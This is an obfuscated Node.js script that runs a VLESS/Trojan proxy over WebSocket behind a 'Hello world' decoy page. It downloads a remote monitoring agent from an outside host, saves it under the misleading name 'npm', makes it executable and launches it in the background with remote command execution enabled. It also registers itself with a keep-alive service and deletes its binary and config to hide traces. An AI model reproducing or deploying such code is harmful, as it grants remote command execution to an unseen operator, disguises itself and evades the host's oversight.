const _0x33cb52=_0x2b48;(function(_0x2cecaa,_0x594963){const _0x5344c4=_0x2b48,_0x5b4aa7=_0x2cecaa();while(!![]){try{const _0x307e7d=parseInt(_0x5344c4(0x15f))/0x1*(-parseInt(_0x5344c4(0x160))/0x2)+parseInt(_0x5344c4(0x176))/0x3*(-parseInt(_0x5344c4(0x186))/0x4)+parseInt(_0x5344c4(0x17f))/0x5+parseInt(_0x5344c4(0x152))/0x6+-parseInt(_0x5344c4(0x1ab))/0x7+parseInt(_0x5344c4(0x19e))/0x8+parseInt(_0x5344c4(0x148))/0x9*(-parseInt(_0x5344c4(0x1a5))/0xa);if(_0x307e7d===_0x594963)break;else _0x5b4aa7['push'](_0x5b4aa7['shift']());}catch(_0xddec09){_0x5b4aa7['push'](_0x5b4aa7['shift']());}}}(_0xb4c6,0x3fb51));function _0x2b48(_0x22866a,_0x39837d){const _0xb4c66b=_0xb4c6();return _0x2b48=function(_0x2b48fb,_0xb2568b){_0x2b48fb=_0x2b48fb-0x13c;let _0x44cb92=_0xb4c66b[_0x2b48fb];return _0x44cb92;},_0x2b48(_0x22866a,_0x39837d);}const os=require('os'),http=require(_0x33cb52(0x1a6)),fs=require('fs'),axios=require(_0x33cb52(0x1af)),net=require(_0x33cb52(0x19d)),path=require('path'),crypto=require(_0x33cb52(0x18d)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x33cb52(0x17a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x33cb52(0x193)][_0x33cb52(0x159)]||_0x33cb52(0x1a0),NEZHA_SERVER=process[_0x33cb52(0x193)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x33cb52(0x193)][_0x33cb52(0x19a)]||'',NEZHA_KEY=process[_0x33cb52(0x193)][_0x33cb52(0x156)]||'',DOMAIN=process[_0x33cb52(0x193)][_0x33cb52(0x1b7)]||_0x33cb52(0x153),AUTO_ACCESS=process[_0x33cb52(0x193)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x33cb52(0x1b9)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x33cb52(0x193)][_0x33cb52(0x151)]||'sub',NAME=process[_0x33cb52(0x193)][_0x33cb52(0x155)]||_0x33cb52(0x154),PORT=process['env'][_0x33cb52(0x1a4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5a9e5f=_0x33cb52;try{const _0x1cf322=await axios['get'](_0x5a9e5f(0x1ac)),_0xbd1b04=_0x1cf322[_0x5a9e5f(0x13f)];ISP=(_0xbd1b04[_0x5a9e5f(0x144)]+'-'+_0xbd1b04['asOrganization'])[_0x5a9e5f(0x19f)](/ /g,'_');}catch(_0x224de5){ISP=_0x5a9e5f(0x169);}};GetISP();const httpServer=http['createServer']((_0x21baf8,_0x3e40cd)=>{const _0xec4590=_0x33cb52;if(_0x21baf8['url']==='/'){const _0x4e27c1=path['join'](__dirname,_0xec4590(0x198));fs['readFile'](_0x4e27c1,_0xec4590(0x1a7),(_0x4b220d,_0x20c7b0)=>{const _0x3e2eba=_0xec4590;if(_0x4b220d){_0x3e40cd[_0x3e2eba(0x13c)](0xc8,{'Content-Type':_0x3e2eba(0x146)}),_0x3e40cd[_0x3e2eba(0x147)](_0x3e2eba(0x175));return;}_0x3e40cd[_0x3e2eba(0x13c)](0xc8,{'Content-Type':_0x3e2eba(0x146)}),_0x3e40cd['end'](_0x20c7b0);});return;}else{if(_0x21baf8['url']==='/'+SUB_PATH){const _0x168850=_0xec4590(0x166)+UUID+'@'+DOMAIN+_0xec4590(0x13d)+DOMAIN+_0xec4590(0x165)+DOMAIN+_0xec4590(0x18e)+WSPATH+'#'+NAME+'-'+ISP,_0x14a431=_0xec4590(0x14d)+UUID+'@'+DOMAIN+_0xec4590(0x196)+DOMAIN+_0xec4590(0x165)+DOMAIN+_0xec4590(0x18e)+WSPATH+'#'+NAME+'-'+ISP,_0x19d6bd=_0x168850+'\x0a'+_0x14a431,_0xa64c24=Buffer[_0xec4590(0x19b)](_0x19d6bd)[_0xec4590(0x15a)](_0xec4590(0x16e));_0x3e40cd[_0xec4590(0x13c)](0xc8,{'Content-Type':_0xec4590(0x190)}),_0x3e40cd[_0xec4590(0x147)](_0xa64c24+'\x0a');}else _0x3e40cd[_0xec4590(0x13c)](0x194,{'Content-Type':_0xec4590(0x190)}),_0x3e40cd[_0xec4590(0x147)](_0xec4590(0x143));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x33cb52(0x19f)](/-/g,''),DNS_SERVERS=[_0x33cb52(0x197),_0x33cb52(0x15c)];function resolveHost(_0x3a238f){return new Promise((_0x29c8b7,_0xd9bc95)=>{const _0x534155=_0x2b48;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x534155(0x15d)](_0x3a238f)){_0x29c8b7(_0x3a238f);return;}let _0x5baeb0=0x0;function _0x1627e6(){const _0x520ff9=_0x534155;if(_0x5baeb0>=DNS_SERVERS['length']){_0xd9bc95(new Error('Failed\x20to\x20resolve\x20'+_0x3a238f+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xb9c028=DNS_SERVERS[_0x5baeb0];_0x5baeb0++;const _0xd99b4d=_0x520ff9(0x1a8)+encodeURIComponent(_0x3a238f)+'&type=A';axios[_0x520ff9(0x16a)](_0xd99b4d,{'timeout':0x1388,'headers':{'Accept':_0x520ff9(0x168)}})[_0x520ff9(0x157)](_0xc4e3eb=>{const _0x7e6e0f=_0x520ff9,_0x8c9ea8=_0xc4e3eb[_0x7e6e0f(0x13f)];if(_0x8c9ea8['Status']===0x0&&_0x8c9ea8[_0x7e6e0f(0x150)]&&_0x8c9ea8['Answer']['length']>0x0){const _0x3f82e7=_0x8c9ea8[_0x7e6e0f(0x150)][_0x7e6e0f(0x19c)](_0x33e06e=>_0x33e06e[_0x7e6e0f(0x182)]===0x1);if(_0x3f82e7){_0x29c8b7(_0x3f82e7[_0x7e6e0f(0x13f)]);return;}}_0x1627e6();})['catch'](_0x5d3a77=>{_0x1627e6();});}_0x1627e6();});}function handleVlessConnection(_0xc48ccc,_0x2e5205){const _0x5bb0d7=_0x33cb52,[_0x22d883]=_0x2e5205,_0x16295b=_0x2e5205['slice'](0x1,0x11);if(!_0x16295b[_0x5bb0d7(0x164)]((_0x212ee2,_0x3af06e)=>_0x212ee2==parseInt(uuid['substr'](_0x3af06e*0x2,0x2),0x10)))return![];let _0x202291=_0x2e5205[_0x5bb0d7(0x187)](0x11,0x12)['readUInt8']()+0x13;const _0x4e84c8=_0x2e5205[_0x5bb0d7(0x187)](_0x202291,_0x202291+=0x2)[_0x5bb0d7(0x1a1)](0x0),_0xffc111=_0x2e5205['slice'](_0x202291,_0x202291+=0x1)['readUInt8'](),_0xe7e028=_0xffc111==0x1?_0x2e5205['slice'](_0x202291,_0x202291+=0x4)['join']('.'):_0xffc111==0x2?new TextDecoder()[_0x5bb0d7(0x18c)](_0x2e5205[_0x5bb0d7(0x187)](_0x202291+0x1,_0x202291+=0x1+_0x2e5205[_0x5bb0d7(0x187)](_0x202291,_0x202291+0x1)[_0x5bb0d7(0x14c)]())):_0xffc111==0x3?_0x2e5205['slice'](_0x202291,_0x202291+=0x10)['reduce']((_0x5e42d3,_0x4eea3f,_0x149089,_0x3f2512)=>_0x149089%0x2?_0x5e42d3[_0x5bb0d7(0x163)](_0x3f2512[_0x5bb0d7(0x187)](_0x149089-0x1,_0x149089+0x1)):_0x5e42d3,[])['map'](_0x515ff5=>_0x515ff5[_0x5bb0d7(0x1a1)](0x0)['toString'](0x10))[_0x5bb0d7(0x177)](':'):'';_0xc48ccc['send'](new Uint8Array([_0x22d883,0x0]));const _0x2baf0a=createWebSocketStream(_0xc48ccc);return resolveHost(_0xe7e028)['then'](_0x1f11ff=>{const _0x38b522=_0x5bb0d7;net[_0x38b522(0x1b1)]({'host':_0x1f11ff,'port':_0x4e84c8},function(){const _0x312285=_0x38b522;this[_0x312285(0x161)](_0x2e5205['slice'](_0x202291)),_0x2baf0a['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x312285(0x1b3)](_0x2baf0a);})['on'](_0x38b522(0x13e),()=>{});})[_0x5bb0d7(0x142)](_0x478bd5=>{const _0x5cca0d=_0x5bb0d7;net[_0x5cca0d(0x1b1)]({'host':_0xe7e028,'port':_0x4e84c8},function(){const _0x25a4bf=_0x5cca0d;this[_0x25a4bf(0x161)](_0x2e5205[_0x25a4bf(0x187)](_0x202291)),_0x2baf0a['on'](_0x25a4bf(0x13e),()=>{})[_0x25a4bf(0x1b3)](this)['on'](_0x25a4bf(0x13e),()=>{})[_0x25a4bf(0x1b3)](_0x2baf0a);})['on'](_0x5cca0d(0x13e),()=>{});}),!![];}function handleTrojanConnection(_0x3bad15,_0x232d4c){const _0x551512=_0x33cb52;try{if(_0x232d4c[_0x551512(0x191)]<0x3a)return![];const _0x48641e=_0x232d4c[_0x551512(0x187)](0x0,0x38)[_0x551512(0x15a)](),_0x2f86d4=[UUID];let _0x8ad0b5=null;for(const _0x1be654 of _0x2f86d4){const _0x15c3c9=crypto[_0x551512(0x174)](_0x551512(0x158))[_0x551512(0x1ad)](_0x1be654)[_0x551512(0x180)](_0x551512(0x18b));if(_0x15c3c9===_0x48641e){_0x8ad0b5=_0x1be654;break;}}if(!_0x8ad0b5)return![];let _0x3a3458=0x38;_0x232d4c[_0x3a3458]===0xd&&_0x232d4c[_0x3a3458+0x1]===0xa&&(_0x3a3458+=0x2);const _0x5b0cbe=_0x232d4c[_0x3a3458];if(_0x5b0cbe!==0x1)return![];_0x3a3458+=0x1;const _0x5763f=_0x232d4c[_0x3a3458];_0x3a3458+=0x1;let _0x1ce4dc,_0x1348cd;if(_0x5763f===0x1)_0x1ce4dc=_0x232d4c[_0x551512(0x187)](_0x3a3458,_0x3a3458+0x4)[_0x551512(0x177)]('.'),_0x3a3458+=0x4;else{if(_0x5763f===0x3){const _0x444f7e=_0x232d4c[_0x3a3458];_0x3a3458+=0x1,_0x1ce4dc=_0x232d4c[_0x551512(0x187)](_0x3a3458,_0x3a3458+_0x444f7e)[_0x551512(0x15a)](),_0x3a3458+=_0x444f7e;}else{if(_0x5763f===0x4)_0x1ce4dc=_0x232d4c['slice'](_0x3a3458,_0x3a3458+0x10)[_0x551512(0x183)]((_0x1a9225,_0xf727b9,_0x4e0531,_0x2ed9c)=>_0x4e0531%0x2?_0x1a9225[_0x551512(0x163)](_0x2ed9c[_0x551512(0x187)](_0x4e0531-0x1,_0x4e0531+0x1)):_0x1a9225,[])[_0x551512(0x16f)](_0x27e77c=>_0x27e77c['readUInt16BE'](0x0)[_0x551512(0x15a)](0x10))['join'](':'),_0x3a3458+=0x10;else return![];}}_0x1348cd=_0x232d4c[_0x551512(0x1a1)](_0x3a3458),_0x3a3458+=0x2;_0x3a3458<_0x232d4c[_0x551512(0x191)]&&_0x232d4c[_0x3a3458]===0xd&&_0x232d4c[_0x3a3458+0x1]===0xa&&(_0x3a3458+=0x2);const _0x2cc8ec=createWebSocketStream(_0x3bad15);return resolveHost(_0x1ce4dc)[_0x551512(0x157)](_0xe87bd4=>{const _0x54150e=_0x551512;net[_0x54150e(0x1b1)]({'host':_0xe87bd4,'port':_0x1348cd},function(){const _0x1a65cd=_0x54150e;_0x3a3458<_0x232d4c['length']&&this[_0x1a65cd(0x161)](_0x232d4c['slice'](_0x3a3458)),_0x2cc8ec['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x1a65cd(0x1b3)](_0x2cc8ec);})['on'](_0x54150e(0x13e),()=>{});})['catch'](_0x254cd4=>{const _0x483762=_0x551512;net[_0x483762(0x1b1)]({'host':_0x1ce4dc,'port':_0x1348cd},function(){const _0x2ebcb8=_0x483762;_0x3a3458<_0x232d4c['length']&&this[_0x2ebcb8(0x161)](_0x232d4c[_0x2ebcb8(0x187)](_0x3a3458)),_0x2cc8ec['on'](_0x2ebcb8(0x13e),()=>{})[_0x2ebcb8(0x1b3)](this)['on'](_0x2ebcb8(0x13e),()=>{})[_0x2ebcb8(0x1b3)](_0x2cc8ec);})['on'](_0x483762(0x13e),()=>{});}),!![];}catch(_0x1085ac){return![];}}wss['on']('connection',(_0xa2776d,_0x2d023e)=>{const _0x160ff8=_0x33cb52,_0x4e60b8=_0x2d023e[_0x160ff8(0x14a)]||'';_0xa2776d[_0x160ff8(0x199)](_0x160ff8(0x185),_0x5dd6ef=>{const _0x4e384c=_0x160ff8;if(_0x5dd6ef[_0x4e384c(0x191)]>0x11&&_0x5dd6ef[0x0]===0x0){const _0x43ab5e=_0x5dd6ef[_0x4e384c(0x187)](0x1,0x11),_0x10e9f4=_0x43ab5e[_0x4e384c(0x164)]((_0x1dd064,_0x4b77a2)=>_0x1dd064==parseInt(uuid[_0x4e384c(0x1a3)](_0x4b77a2*0x2,0x2),0x10));if(_0x10e9f4){!handleVlessConnection(_0xa2776d,_0x5dd6ef)&&_0xa2776d[_0x4e384c(0x171)]();return;}}!handleTrojanConnection(_0xa2776d,_0x5dd6ef)&&_0xa2776d['close']();})['on'](_0x160ff8(0x13e),()=>{});});const getDownloadUrl=()=>{const _0x50d781=_0x33cb52,_0x5c8725=os[_0x50d781(0x1a2)]();return _0x5c8725===_0x50d781(0x18f)||_0x5c8725==='arm64'||_0x5c8725===_0x50d781(0x192)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x50d781(0x194):!NEZHA_PORT?_0x50d781(0x16b):_0x50d781(0x18a);},downloadFile=async()=>{const _0x23e007=_0x33cb52;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1dac2c=getDownloadUrl(),_0x35975d=await axios({'method':_0x23e007(0x16a),'url':_0x1dac2c,'responseType':'stream'}),_0x4a4716=fs[_0x23e007(0x141)]('npm');return _0x35975d[_0x23e007(0x13f)][_0x23e007(0x1b3)](_0x4a4716),new Promise((_0x19c682,_0x5e1074)=>{const _0xf8bb9c=_0x23e007;_0x4a4716['on'](_0xf8bb9c(0x14e),()=>{const _0x5555be=_0xf8bb9c;console['log'](_0x5555be(0x15b)),exec('chmod\x20+x\x20npm',_0x3348f0=>{if(_0x3348f0)_0x5e1074(_0x3348f0);_0x19c682();});}),_0x4a4716['on'](_0xf8bb9c(0x13e),_0x5e1074);});}catch(_0x4305df){throw _0x4305df;}},runnz=async()=>{const _0x934932=_0x33cb52;try{const _0x3968fd=execSync(_0x934932(0x178),{'encoding':_0x934932(0x179)});if(_0x3968fd[_0x934932(0x162)]()!==''){console['log'](_0x934932(0x172));return;}}catch(_0x2bf5b3){}await downloadFile();let _0x4169c2='',_0x37d4c1=[_0x934932(0x1a9),_0x934932(0x17b),_0x934932(0x1b6),_0x934932(0x16c),_0x934932(0x17e),_0x934932(0x1ae)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5d6da6=_0x37d4c1['includes'](NEZHA_PORT)?_0x934932(0x17d):'';_0x4169c2=_0x934932(0x1b0)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5d6da6+_0x934932(0x15e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x16858d=NEZHA_SERVER[_0x934932(0x145)](':')?NEZHA_SERVER[_0x934932(0x140)](':')[_0x934932(0x1aa)]():'',_0x3c1fae=_0x37d4c1[_0x934932(0x145)](_0x16858d)?_0x934932(0x149):_0x934932(0x1b8),_0x444b68='client_secret:\x20'+NEZHA_KEY+_0x934932(0x1b4)+NEZHA_SERVER+_0x934932(0x188)+_0x3c1fae+_0x934932(0x170)+UUID;fs['writeFileSync'](_0x934932(0x167),_0x444b68);}_0x4169c2='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x934932(0x16d)](_0x934932(0x195));return;}}try{exec(_0x4169c2,{'shell':_0x934932(0x1b2)},_0x4368db=>{const _0x4db2ec=_0x934932;if(_0x4368db)console['error'](_0x4db2ec(0x184),_0x4368db);else console[_0x4db2ec(0x16d)](_0x4db2ec(0x189));});}catch(_0x27a3b2){console[_0x934932(0x13e)]('error:\x20'+_0x27a3b2);}};function _0xb4c6(){const _0xe18a85=['/bin/bash','pipe','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm','2096','DOMAIN','false','WSPATH','writeHead',':443?encryption=none&security=tls&sni=','error','data','split','createWriteStream','catch','Not\x20Found\x0a','country','includes','text/html','end','27MyNQzH','true','url','post','readUInt8','trojan://','finish','unlink','Answer','SUB_PATH','935142WFZgIB','hug.144944.top','Hug','NAME','NEZHA_KEY','then','sha224','UUID','toString','npm\x20download\x20successfully','1.1.1.1','test','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','197870HBrSQp','2QlOAQj','write','trim','concat','every','&fp=chrome&type=ws&host=','vless://','config.yaml','application/dns-json','Unknown','get','https://amd64.ssss.nyc.mn/v1','2087','log','base64','map','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','close','npm\x20is\x20already\x20running,\x20skip\x20running...','https://oooo.serv00.net/add-url','createHash','Hello\x20world!','121143YXKJKt','join','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','utf-8','child_process','8443','Server\x20is\x20running\x20on\x20port\x20','--tls','2083','2307135cdvHny','digest','Automatic\x20Access\x20Task\x20added\x20successfully','type','reduce','npm\x20running\x20error:','message','20KTCLGT','slice','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20is\x20running','https://amd64.ssss.nyc.mn/agent','hex','decode','crypto','&path=%2F','arm','text/plain','length','aarch64','env','https://arm64.ssss.nyc.mn/agent','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running',':443?security=tls&sni=','8.8.4.4','index.html','once','NEZHA_PORT','from','find','net','2657400CDJjbe','replace','2224b478-8824-409b-ba5e-1128801fa866','readUInt16BE','arch','substr','PORT','180610iEwMbQ','http','utf8','https://dns.google/resolve?name=','443','pop','1641892iizHoU','https://speed.cloudflare.com/meta','update','2053','axios','setsid\x20nohup\x20./npm\x20-s\x20','connect'];_0xb4c6=function(){return _0xe18a85;};return _0xb4c6();}async function addAccessTask(){const _0xb71c5d=_0x33cb52;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x42007e='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x2f7c8b=await axios[_0xb71c5d(0x14b)](_0xb71c5d(0x173),{'url':_0x42007e},{'headers':{'Content-Type':'application/json'}});console[_0xb71c5d(0x16d)](_0xb71c5d(0x181));}catch(_0x407fde){}}const delFiles=()=>{const _0x4e2555=_0x33cb52;fs[_0x4e2555(0x14f)](_0x4e2555(0x1b5),()=>{}),fs[_0x4e2555(0x14f)](_0x4e2555(0x167),()=>{});};httpServer['listen'](PORT,()=>{const _0x29cac1=_0x33cb52;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x29cac1(0x17c)+PORT);});
